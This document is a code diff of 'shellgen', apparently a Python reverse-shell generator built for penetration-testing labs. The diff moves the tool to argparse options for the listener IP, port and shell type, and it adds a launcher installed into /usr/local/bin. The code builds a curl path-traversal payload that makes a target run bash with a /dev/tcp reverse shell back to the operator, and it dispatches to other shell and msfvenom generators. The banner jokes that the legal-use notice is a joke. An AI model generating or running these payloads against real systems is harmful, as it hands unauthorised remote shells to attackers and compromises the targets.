@@ -8,6 +8,7 @@
 
 import sys
 import os
+import argparse
 import subprocess
 from time import sleep
 from src.design import print_error, print_info, print_shell, print_shell_types, bcolors, print_list_shells
@@ -22,6 +23,7 @@ shells = ["bash","go","nc","curl","netcat","msfvenom","perl","php","python","pow
 
 def create_launcher():
 	try:
+		print_info("Creating launcher...")
 		"""
 		Create a launcher to execute shellgen from the commandline.
 		"""
@@ -30,6 +32,9 @@ def create_launcher():
 		filewrite.write('#!/bin/sh\ncd %s\nchmod +x shellgen\n./shellgen "$@"' % (cwd))
 		filewrite.close()
 		subprocess.Popen("chmod +x /usr/local/bin/shellgen", shell=True).wait()
+		
+		print_info("Launcher has been created.")
+		print_info("Now you can run shellgen from anywhere in the terminal")
 	except Exception as error:
 		print_error(error)
 
@@ -45,12 +50,12 @@ def update():
 	# try to update ourself first
 	print_info("Trying to update myself first... Then will generate the shellcode...")
 	subprocess.Popen("git pull", shell=True).wait()
-	print_info("Remember, if there was a new update, terminate this session and re-run the script")
+	print_info("Remember, if there was a new update, terminate this session and re-run the script\n")
 	sleep(2)
 
 
 def banner():
-	__version__ = 0.7
+	__version__ = '0.8 THIS ONE IS THE BOMB!'
 
 	banner = bcolors.DARKGREEN + """
 	███████╗██╗  ██╗███████╗██╗     ██╗      ██████╗ ███████╗███╗   ██╗
@@ -62,7 +67,7 @@ def banner():
 	""" +bcolors.ENDC
 	banner += """
 	Version: """ + bcolors.YELLOW + str(__version__) + bcolors.DARKGREEN + """\n
-	Author: AgentWhite (@__Th3J0k3r__) (github.com/realagentwhite)
+	Author: The Joker (@__Th3J0k3r__) (github.com/thejoker3000)
 	Website: https://thegibson.xyz"""
 	banner += """
 	Reverse shell generator.
@@ -73,24 +78,8 @@ def banner():
 	This tool is developed only for legal purposes.
 	Just kidding. Have fun! :-)
 	""" + bcolors.ENDC
-
+	
 	return banner
-
-def help_menu():
-	print("""
-	Reverse shell generator based on examples pulled from:
-	https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
-	http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet""")
-	print("\n\tCommands you can enter in arguments:")
-	print("\t-h or --help\t\t This help menu")
-	print("\t-u or --update\t\t Run the update and exit")
-	print("\t--no-update\t\t Do not update when running")
-	print("\t--shells or --list-shells\t Lists all the available shells")
-	print("\t-c or --create-launcher\t Creates the launcher to run shellgen from anywhere in the terminal (requires sudo privileges)")
-	print("\n\tHow to use shellgen:")
-	print_info("Run: %s <LHOST> <LPORT> <SHELL TYPE>" % str(sys.argv[0]))
-	sys.exit()
-
 
 def return_curl_shell():
 	target = input("Enter target:~$ "+bcolors.DARKPURPLE);print(bcolors.ENDC)
@@ -98,111 +87,104 @@ def return_curl_shell():
 	curl = """curl -s -X POST 'http://"""+target+""":"""+rport+"""/.%0d./.%0d./.%0d./bin/sh' -d '/bin/bash -c "/bin/bash -i >& /dev/tcp/"""+ip+"""/"""+port+""" 0>&1"'"""
 	print(bcolors.YELLOW+"[1] "+bcolors.ENDC+curl)
 
+
 def main():
-	try:		
-		# Print the IP on tun0 and port we passed in the arguments
-		print(bcolors.DARKGREEN + "[*]tun0 IP: " + ip + " port: " + port + bcolors.ENDC)
-
-		print_error("Shell types:")
-
-		for shell in shells:
-			print_list_shells(shell)
-
-		print_info("\nThere is also the option for 'all' to print all shells")
-		
-		print(bcolors.ENDC)
-		data = input("Enter the type of shell:~$ "+bcolors.DARKPURPLE).lower()
-		print(bcolors.ENDC)
-		
-		# Since for the curl reverse shell you have to enter a target and it's port, I had to create it apart
-		# from the rest of the shell code list
-		if data == 'curl':
-			return_curl_shell()
-		elif data == "msfvenom":
-			from src.msfvenompayloads import msfvenom_shells
-			return msfvenom_shells(ip, port)
-		else:
-			pass
-		
-		return_shells(data, ip, port)
-
-	except KeyboardInterrupt:
-		print()
-		print_info("Exiting...now")
-		sys.exit()
-
-def shellgen():
-	global ip, port
 	try:
-		os.system("clear")
-		print(banner())
+		global update
+		group = argparse.ArgumentParser()
 		
-		if not '--no-update' in sys.argv:
-			# Call the function to grab latest update
+		group.add_argument("-ip", "--lhost", help="Your IP or hostname")
+		#group.add_argument("--target", "--rhost", help="Target IP or hostname")
+		group.add_argument("-p", "--lport", "--port", help="The port to be used (default will be 4444)")
+		group.add_argument("-s", "--shell", help="Type of reverse shell to use")
+		group.add_argument("-u", "--update", help="When given this argument it will update and continue", action="store_true")
+		group.add_argument("-ls", "--shells", help="Lists all available shells", action="store_true")
+		group.add_argument("-c", "--create-launcher", help="Creates a launcher to run anywhere in terminal (requires sudo)", action="store_true")
+		group.add_argument("--no-update", help="Skip the update check (DO NOT USE - NOT WORKING AS IT SHOULD)", action="store_true")
+		group.add_argument("-m", "--manual", help="Read the manual for guidance (Shows README.md file)", action="store_true")
+		
+		args = group.parse_args()
+
+		if args.update:
 			update()
+
+		'''if args.update and len(sys.argv) > 2:
+			update()			
 			os.system("clear")
 			print(banner())
 		else:
-			pass
-
-		if '-h' in sys.argv or '--help' in sys.argv:
-			help_menu()
-		elif '-u' in sys.argv or '--update' in sys.argv:
+			print_info("Only updating and I will leave you alone")
 			update()
-		elif '--shells' in sys.argv or '--list-shells' in sys.argv:
+			sys.exit()'''
+		
+		if args.create_launcher:
+			create_launcher()
+			sys.exit()
+		
+		if args.shells:
 			for i in shells:
 				print_shell_types(i)
-			sys.exit()	
-		elif '-c' in sys.argv or '--create-launcher' in sys.argv:
-			print_info("Creating the launcher")
-			create_launcher()
-			print_info("Launcher has been created.")
-			print_info("Now you can run shellgen from anywhere in the terminal")
 			sys.exit()
-		# If no input from user, print the usage
-		elif len(sys.argv) == 1:
-			print_info("Usage: %s <LHOST> <LPORT> <SHELL TYPE>" % str(sys.argv[0]))
-		# If user inputs port and shell type only
-		elif len(sys.argv) == 3:
+		
+		if args.manual:
+			os.system("cat README.md | more")
+			sys.exit()
+		
+		if args.no_update:
+			update = False
+
+		if args.lhost:
+			print_info("Running through checks now...")
+			sleep(1)
+			print_info("IP has been given...")
+			ip = args.lhost
+		else:
+			print_error("No IP was given...")
+			print_info("Using your VPN IP address...")
 			ip = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
-			port = sys.argv[1]
-			use_shell = sys.argv[2]
-			return_shells(use_shell, ip, port)
-			#main()
-		# If the user inputs the IP to use, port and shellcode to use
-		elif len(sys.argv) == 4:
-			ip = sys.argv[1]
-			port = sys.argv[2]
-			use_shell = sys.argv[3]
-			# Curl is speciall so this function helps out
-			if 'curl' == use_shell:
+			
+		if args.lport:
+			print_info("Port has been given...")
+			port = args.lport
+		else:
+			print_info("No port given but going to use the default (4444)...")
+			port = "4444"
+
+		if args.shell:
+			print_info("A shell type was given also...")
+			if "curl" in args.shell:
 				return_curl_shell()
-
-			return_shells(use_shell, ip, port)
-
-		elif len(sys.argv) == 2:
-			if '.' in sys.argv[-1]:
-				print_error("You forgot to add the port wich goes last in the arguments.") 
+				sys.exit()
+			if "msfvenom" in args.shell:
+				target = input("Enter target:~$ "+bcolors.DARKPURPLE);print(bcolors.ENDC)
+				
+			else:
+				shell = args.shell
+				return_shells(shell, ip, port)
+		else:
+			shell = input("\nWhat shell would you like to use? ")
+			if shell in shells:
+				print_info("OK. Now I have a shell to use...")
+				return_shells(shell, ip, port)
 				sys.exit()
 			else:
-				# The variable below will get the VPN of the tun0 instead of the user having to enter it
-				ip = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
-				port = sys.argv[1]
-				main()
-		else:
-			# The variable below will get the VPN of the tun0 instead of the user having to enter it
-			ip = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
-			port = sys.argv[1]
-			main()
-	except IndexError:
-		print_error("Check that you are connected to the VPN\n")
+				print_error("No shell was given again or shell entered is not available yet.")
+				sys.exit()
+	
+	except KeyboardInterrupt:
+		print()
+		print_error("Aborting all cyber operations")
 		sys.exit()
-	except Exception as error:
-		print_error("Darnit! Something happened! Not sure what but will show you")
-		print_error(error)
-		print_error("Please report this to the developer/s on that strange Github thingy")
+	except IndexError as ie:
+		print()
+		print_error("Houston, we have a problem!")
+		print(ie)
+		print_error("Make sure you are connected to the VPN or have internet connection")
 		sys.exit()
+
 
 
 if __name__ == "__main__":
-	shellgen()
+	os.system("clear")
+	print(banner())
+	main()
